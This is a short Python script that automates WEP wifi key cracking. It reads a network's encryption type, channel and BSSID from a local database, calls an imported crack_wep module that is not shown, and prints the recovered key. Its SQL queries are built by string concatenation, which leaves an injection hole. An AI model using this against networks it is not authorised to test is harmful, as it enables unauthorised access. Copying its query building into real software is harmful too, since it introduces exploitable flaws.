#!/usr/bin/python

import crack_wep
import socket
from database import *

def crack_network(ESSID):
	query="select encryption from ap_info where caption= '"
	query+=socket.gethostname()
	query+="'and wifi_network='"
	query+=ESSID
	query+="';"
	result= executequery (query)
	encryption= result [0][0]
	print ("found encryption")
	if encryption=="WEP":
		query="select channel, mac_adress, quality from ap_info where caption = '"
		query+=socket.gethostname()
		query+="'and wifi_network ='"
		query+=(ESSID)
		query+="' order by 3 desc limit 1"
		result= executequery(query)
		channel=result[0][0]
		BSSID=result[0][1]
		crack_wep.automated_crack(ESSID, BSSID, channel)
	file= open ("/home/isis/key")
	key= file.read()
	print (key)

if __name__ == '__main__':
	crack_network ("airmon-ng")